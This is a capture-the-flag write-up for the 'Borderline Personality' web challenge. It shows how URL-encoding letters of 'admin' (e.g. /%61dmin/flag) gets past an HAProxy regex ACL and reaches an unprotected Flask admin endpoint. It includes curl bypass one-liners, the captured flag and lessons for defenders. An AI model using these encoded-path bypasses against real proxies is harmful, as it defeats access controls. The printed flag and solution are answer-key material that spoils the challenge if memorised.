# Borderline Personality — EHAXctf Web Challenge

| Field | Value |
|-------|-------|
| **Challenge** | Borderline Personality |
| **Category** | Web |
| **Remote** | `http://chall.ehax.in:9098/` |
| **Flag** | `EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}` |

---

## Challenge Description

> The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.

---

## Architecture Analysis

The challenge provides a `handout.zip` with the full Docker setup:

```
handout/
├── docker-compose.yml
├── haproxy/
│   └── haproxy.cfg
└── backend/
    ├── Dockerfile
    ├── requirements.txt
    ├── app.py
    └── templates/
        └── index.html
```

### Components

1. **HAProxy 1.9.1-alpine** — Reverse proxy on port 8080 (exposed as 9098)
2. **Flask 2.0.3 + Gunicorn 20.1.0** — Backend on port 5000 (internal)

Traffic flow: `Client → HAProxy:8080 → Gunicorn:5000 (Flask)`

---

## Source Code Review

### Backend — `app.py`

```python
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.get_data()
    return jsonify({"status": "success", "message": "Data received."}), 200

@app.route('/admin/flag', methods=['GET', 'POST'])
def flag():
    return "EHAX{TEST_FLAG}\n", 200

@app.errorhandler(404)
def not_found(e):
    return "Not Found\n", 404
```

The `/admin/flag` endpoint is completely unrestricted at the application layer — it returns the flag to anyone who reaches it. The only protection is the proxy.

### HAProxy Configuration — `haproxy.cfg`

```
frontend http-in
    bind *:8080

    acl restricted_path path -m reg ^/+admin
    http-request deny if restricted_path

    default_backend application_backend

backend application_backend
    server backend1 backend:5000
```

The ACL rule:
```
acl restricted_path path -m reg ^/+admin
```

This uses regex matching (`-m reg`) on the **raw request path**. The regex `^/+admin` matches:
- `/admin` (one `/` + `admin`)
- `//admin` (two `/` + `admin`)
- `///admin` (etc.)

**Critical weakness**: HAProxy matches the regex against the **raw, undecoded** URL path.

---

## Vulnerability: URL Encoding ACL Bypass

The regex `^/+admin` matches the **literal string** `admin`. HAProxy does **not** decode URL-encoded characters before applying ACL regex rules (in version 1.9.1).

However, Flask/Werkzeug **does** decode URL-encoded paths before routing. This creates a normalization gap:

| Layer | Sees | Action |
|-------|------|--------|
| HAProxy | `/%61dmin/flag` | Regex `^/+admin` → **no match** → ALLOW |
| Flask | `/admin/flag` | Route match → returns flag |

The character `a` can be URL-encoded as `%61`. So:
- `/%61dmin/flag` bypasses HAProxy's ACL
- Flask decodes `%61` → `a`, routing to `/admin/flag`

---

## Exploitation

### One-liner

```bash
curl -sS --path-as-is "http://chall.ehax.in:9098/%61dmin/flag"
```

### Result

```
EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}
```

### Other valid bypasses

Any URL-encoded character in `admin` works:

```bash
# %61 = a
curl --path-as-is "http://chall.ehax.in:9098/%61dmin/flag"

# %64 = d
curl --path-as-is "http://chall.ehax.in:9098/a%64min/flag"

# %6d = m
curl --path-as-is "http://chall.ehax.in:9098/ad%6din/flag"

# Multiple encodings
curl --path-as-is "http://chall.ehax.in:9098/%61%64%6d%69%6e/flag"
```

Note: `--path-as-is` is needed to prevent curl from normalizing the URL before sending.

---

## Why Other Approaches Don't Work

| Technique | Result | Reason |
|-----------|--------|--------|
| `/Admin/flag` (case change) | 404 | Flask routes are case-sensitive |
| `/./admin/flag` | 404 | HAProxy normalizes `.` in paths before ACL |
| `/../admin/flag` | 403 | HAProxy still matches after normalization |
| `//admin/flag` | 403 | Regex `^/+admin` handles multiple slashes |

---

## Key Lessons

1. **Proxy/backend normalization gaps** — When a proxy applies security rules on raw paths but the backend decodes URLs before routing, URL encoding can bypass ACLs.

2. **HAProxy `path -m reg` operates on raw bytes** — In HAProxy 1.9.1, regex ACLs match against the undecoded request URI. Modern versions may have `path -m reg -i` or use `url_dec()` converters to mitigate this.

3. **Defense in depth** — Never rely solely on a reverse proxy for access control. The Flask app should have its own authentication/authorization on `/admin/flag`.

4. **The challenge name hints at the solution** — "Borderline Personality" = boundary/personality disorder = the proxy and backend have different "personalities" (path interpretation).

---

## Files

| File | Description |
|------|-------------|
| `solve.sh` | One-line exploit script |
| `flag.txt` | Captured flag |
| `solution.md` | This writeup |
| `handout/` | Original challenge source code |
